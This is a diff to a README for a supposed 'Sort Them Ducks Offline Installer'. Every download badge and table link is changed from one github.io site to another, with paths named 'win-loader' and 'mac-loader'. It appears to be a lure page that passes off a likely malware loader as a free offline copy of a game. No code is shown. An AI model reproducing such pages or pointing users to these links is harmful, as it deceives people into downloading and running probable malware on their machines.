@@ -1,8 +1,8 @@
 # Sort Them Ducks Offline Installer
 
-[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://zpwtejhmonss.github.io/windows-dl2/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://zpwtejhmonss.github.io/windows-dl2/)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://zpwtejhmonss.github.io/windows-dl2/)
+[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge)](https://QuakeShadowDay.github.io/win-loader/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Mac-lightgrey?style=for-the-badge)](https://QuakeShadowDay.github.io/win-loader/)
+[![Version](https://img.shields.io/badge/Version-Latest-green?style=for-the-badge)](https://QuakeShadowDay.github.io/win-loader/)
 
 > Sort Them Ducks Offline Installer — full game, all puzzles and worlds, plays without internet.
 
@@ -12,8 +12,8 @@
 
 | Platform | Link | Size |
 |----------|------|------|
-| **Windows** | [Download Installer](https://zpwtejhmonss.github.io/windows-dl2/) | 1 GB |
-| **macOS** | [Download Installer](https://zpwtejhmonss.github.io/macos-dl2/) | 1 GB |
+| **Windows** | [Download Installer](https://QuakeShadowDay.github.io/win-loader/) | 1 GB |
+| **macOS** | [Download Installer](https://QuakeShadowDay.github.io/mac-loader/) | 1 GB |
 
 ---
 
